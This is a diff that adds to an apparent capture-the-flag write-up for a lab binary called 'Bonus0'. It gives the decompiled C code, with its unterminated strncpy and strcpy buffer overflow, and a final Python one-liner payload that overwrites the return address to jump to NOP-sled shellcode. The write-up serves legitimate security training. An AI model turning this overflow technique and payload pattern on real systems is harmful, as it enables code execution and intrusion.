@@ -1,3 +1,50 @@
+# Bonus0
+
+## Code
+
+```
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+
+unsigned short *a = 32;
+
+void    p(char *dest, char *s)
+{
+  char buf[4096];
+
+  puts(s);
+  read(0, buf, 4096);
+  *strchr(buf, '\n') = 0;
+  strncpy(dest, buf, 20);
+}
+
+void    pp(char *dest)
+{
+  char str1[20]; 
+  char str2[20];
+
+  p(str1, " - ");
+  p(str2, " - ");
+  strcpy(dest, str1);
+  dest[strlen(dest)] = *a;
+  strcat(dest, str2);
+}
+
+int     main(int argc, const char **argv)
+{
+  char s[42];
+
+  pp(s);
+  puts(s);
+  return 0;
+}
+```
+
+## Explanation
+
+
 - This program takes two strings and does some copying and concatenation
     stuff with them before displaying both strings.
 
@@ -53,10 +100,12 @@
 - When executing it we got the address 0xbffff805, so our jump needs to be done there,
     or a few bytes later since we have 50 NOP bytes.
 
+## Exploit
+
 - So here is our final payload :
-
-    (python -c'print "A" * 30' ; python -c'print "A" * 9 + "\xbf\xff\xf8\x08"[::-1] + "A" * 50' ; cat)  | ./bonus0
-
+```
+$    (python -c'print "A" * 30' ; python -c'print "A" * 9 + "\xbf\xff\xf8\x08"[::-1] + "A" * 50' ; cat)  | ./bonus0
+```
 - Of course, the number of "A"s in the first string, and the number of "A"s after 
     the shellcode address in the second string can be different, as long as the
     final strings are longer than 20.
